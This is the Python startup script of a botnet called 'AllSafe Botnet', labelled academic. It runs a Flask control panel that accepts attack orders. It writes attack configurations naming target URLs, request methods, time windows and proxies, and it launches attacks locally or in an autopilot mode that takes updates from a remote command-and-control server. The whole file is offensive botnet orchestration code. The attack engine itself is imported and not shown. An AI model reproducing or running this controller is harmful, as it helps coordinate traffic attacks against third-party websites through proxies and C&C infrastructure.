#!/usr/bin/python3
"""
This is the startup script for the botnet. Please note that the software is developed under.
Python 3.4.x version of the interpreter.

Authors:    Alessio "Tyrell" Moretti & Federico "Elliot" Vagnoni
Version:    0.1.0
Created:    24 October 2016
Modified:   09 February 2017
"""

from flask import Flask
from flask import render_template
from flask import request
from flask import abort
from flask import redirect

from time import time
import sys

import requests
from requests.auth import HTTPBasicAuth

import json
import Botnet

from collections import OrderedDict
from utils.config import rootSchema, targetSchema, requestSchema


app = Flask(__name__)

"""
The Botnet will use a simple implementation of a micro WebServer using Flask

It will receive HTTP request in both GET and POST method on the root page.

If the method is POST, a login request is assumed and the login process will be performed;
if the process fails an error message will be returned; if it will succed the amdin page will be returned.

If the method is GET, the login form will be shown.
"""
@app.route("/", methods=['GET', 'POST'])
def showControlPage():
    return render_template("localcontrolpage.html")

"""
In the controlpage you can submit a new request of two different type: upload or attack.

Upload has not subtypes. It only allows to prepare the configuration file that will be used
to performa local or a remote attack using the json file given as example.

Attack has two subtypes: local or remote. The former will use the AllSafeBotnet class (defined in Worker.py) to carry
the attack using the override parameter set to True, while the latter will use the same method with the override param
set to False.
"""
@app.route("/submit", methods=['POST'])
def performAttack():
    print(request.json)
    # print("inizio")
    # retrieving and polishing C&C server and prepare config file
    if 'autopilot_start' in request.json:
        allsafe = Botnet.AllSafeBotnet()
        allsafe.autopilot(request.json['cc_server_auto'], {}, int(request.json['contact_time']), override=False)
        return "OK", 200

    # if not autopilot mode, we will experience a step-by-step attack session
    # let we check for configuration file formatting...
    try:
        # prepare configuration
        cc_server = prepareConfigFile(request.json)
        config_path = './data/current_attack.json'
        # prepare botnet resources
        allsafe = Botnet.AllSafeBotnet()
        # if the attack to be carried without updates from C&C?
        if 'local_attack' not in request.json:
            allsafe.attack(config_path, override=True)
        # else we set to attack to be carried using updated configuration if any
        else:
            if '://' not in cc_server:
                cc_server = 'http://' + cc_server
            allsafe.attack(config_path, override=False)
            # return success
        return "OK", 200
    except Exception:
        return "Invalid request", 402

def prepareConfigFile(params, where='./data/current_attack.json'):

    localRootSchema = rootSchema

    # Only the useful key values will be changed accordingly
    localRootSchema['last_modified'] = round(time())
    localRootSchema['cc_server'] = params['cc_server'] if 'cc_server' in params else ""

    # Creation of the requestSchema
    for elem in params['target']:
        # Creation of the locaTargetSchema based upon the TargetSchema
        localTargetSchema = targetSchema
        localTargetSchema['period'] = elem['period'] if 'period' in params else 0
        localTargetSchema['max_count'] = elem['max_count'] if 'max_count' in params else 0

        # Creation of the actionCondition dictionary
        actionConditions = OrderedDict()

        # If AMPM has been choosen both AM and PM will be set on 1
        ampm = elem['AMPM'] if 'AMPM' in elem else ""
        if ampm == "AM":
            actionConditions['AM'] = 1
            actionConditions['PM'] = 0
        if ampm == "PM":
            actionConditions['AM'] = 0
            actionConditions['PM'] = 1
        if ampm == "AMPM":
            actionConditions['AM'] = 1
            actionConditions['PM'] = 1
        if elem['hour_start'] == "" or elem['hour_end'] == "":
            actionConditions['attack_time'] = ""
        else:
            actionConditions['attack_time'] = elem['hour_start'] + "-" + elem['hour_end']
        actionConditions['avoid_week'] = elem['avoid_week'] if 'avoid_week' in params else ""
        actionConditions['avoid_month'] = elem['avoid_month'] if 'avoid_month' in params else ""

        # ActionConditions is now poart of the localTargetSchema
        localTargetSchema['action_conditions'] = actionConditions

        localRequestSchema = requestSchema
        localRequestSchema['method'] = elem['method'] if 'method' in elem else ""
        localRequestSchema['url'] = elem['url'] if 'url' in elem else ""
        localRequestSchema['resources'] = elem['resources'] if 'resources' in elem else ""
        localRequestSchema['encoding'] = elem['encoding'] if 'encoding' in elem else ""

        # Creation of the proxy dictionary
        proxy = OrderedDict()

        # If an element has been specified as https, it will be handeld properly
        for proxy_elem in elem['proxy']:
            if "https://" in proxy_elem:
                proxy['https'] = proxy_elem
            else:
                proxy['http'] = proxy_elem

        # Proxy is now part of localRequestSchema
        localRequestSchema['proxy_server'] = proxy

        # Final combination of the three schemas
        localTargetSchema['request_params'] = localRequestSchema
        localRootSchema['targets'].append(localTargetSchema)

    #The json configuration will be written
    file = open(where, "w")
    file.write(json.dumps(localRootSchema,indent=4))
    file.close()
    return params['cc_server']

@app.route("/p")
def ret():
    return render_template("targetpreferences.html")


if __name__ == "__main__":
    print("-------------------------------------------------------------")
    print("            ALLSAFE BOTNET - Academic purpose only           ")
    print("                          v. 0.1.0                           ")
    print("\nDeveloped with no harmful intentions and love by:          ")
    print("  - Alessio 'Tyrell' Moretti                                 ")
    print("  - Federico 'Elliot' Vagnoni                                ")
    print("-------------------------------------------------------------")
    
    if len(sys.argv) == 1:
        app.run(host='0.0.0.0', port=4042)

    # check for command line headless mode arguments 
    for argument in sys.argv:
        # presetting autopilot timer 
        autopilot_timer = 5

        if '--timer' in argument:
            try:
                autopilot_timer = argument.split("=")[1]
                autopilot_timer = int(autopilot_timer)
                if autopilot_timer < 0:
                    autopilot_timer = 0
            except Exception:
                print("Error entering autopilot mode - timer was invalid")
                sys.exit(EnvironmentError)

        if '--remote' in argument:
            try:
                cc_server = argument.split("=")[1]
                print("- botnet C&C located at:", cc_server)
                allsafe = Botnet.AllSafeBotnet()
                allsafe.autopilot(cc_server, "", autopilot_timer, override=False)
            except Exception:
                print("Error entering autopilot mode - invalid remote address")
                sys.exit(EnvironmentError)

        elif '--config' in argument:
            try:
                configuration = sys.argv[sys.argv.index('--config') + 1]
                print("- botnet client configuration at:", configuration)
                allsafe.autopilot("", configuration, autopilot_timer, override=True)
            except Exception:
                print('Error entering autopilot mode - local configuration')
                sys.exit(EnvironmentError)

        elif '--help'   in argument:
            print("Usage: python3 __init__.py [--OPTION=value]")
            print(" --remote=<remote address for c&c server>")
            print(" --config=<configuration file complete path>")
            print(" --timer=<integer between each update request to C&C")


    if '--detach' in sys.argv:
        if '--remote' in sys.argv:
            try:
                print("[" + str(int(time())) + "]" + "starting headless attack, kill the process to abort...")
                cc_server = sys.argv[sys.argv.index('--remote') + 1]
                print("- botnet C&C located at:", cc_server)
                allsafe = Botnet.AllSafeBotnet()
                allsafe.autopilot(cc_server, './data/current_attack.json', 5, override=False)
            except Exception:
                print("Error entering autopilot mode!")
                sys.exit(EnvironmentError)
        elif '--config' in sys.argv:
            try:
                print("[" + str(int(time())) + "]" + "starting headless attack, kill the process to abort...")
                configuration = sys.argv[sys.argv.index('--config') + 1]
                print("- botnet client configuration at:", configuration)
                allsafe.autopilot("", configuration, 5, override=True)
            except Exception:
                print('Error entering autopilot mode - local configuration')
                sys.exit(EnvironmentError)
        else:
            print("Usage: --detach [--remote <cc_server>] [--config <config_path>]")
    else:
        app.run(host='0.0.0.0', port=4042)